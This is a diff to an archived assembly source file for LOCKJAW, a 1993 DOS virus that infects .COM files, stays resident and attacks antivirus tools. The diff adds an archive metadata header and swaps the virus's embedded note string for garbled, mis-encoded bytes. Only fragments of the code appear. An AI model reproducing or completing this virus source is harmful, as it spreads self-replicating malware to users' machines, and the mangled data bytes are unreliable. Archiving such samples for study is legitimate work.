@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      L
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;LOCKJAW: a .COM-infecting resident virus with retaliatory 
 ;anti-anti-virus capability.  Programmed and contributed by Nikademus, for
 ;Crypt Newsletter 12, Feb. 1993.               
@@ -77,9 +88,9 @@ virus:
 		jmp after_note
 
 note:            
-		db     '[l™‡kõ„W].á.¥Œk†d‰M–$'
-		db     'ÅH‹$.pâ™Gâ†m.Œ$.….{pâ™Å”-Å].ûƒâ‹†¤Å'
-		db     'Åh†¥k$.Å¢.€â˜'
+		db     '[lï¿½ï¿½kï¿½ï¿½W].ï¿½.ï¿½ï¿½kï¿½dï¿½Mï¿½$'
+		db     'ï¿½Hï¿½$.pï¿½Gï¿½m.ï¿½$.ï¿½.{pï¿½Å”-ï¿½].ï¿½ï¿½â‹†ï¿½ï¿½'
+		db     'ï¿½hï¿½ï¿½k$.Å¢.ï¿½â˜'
 
 after_note:     
 		pop     bp                   ; recalculate change in offset          
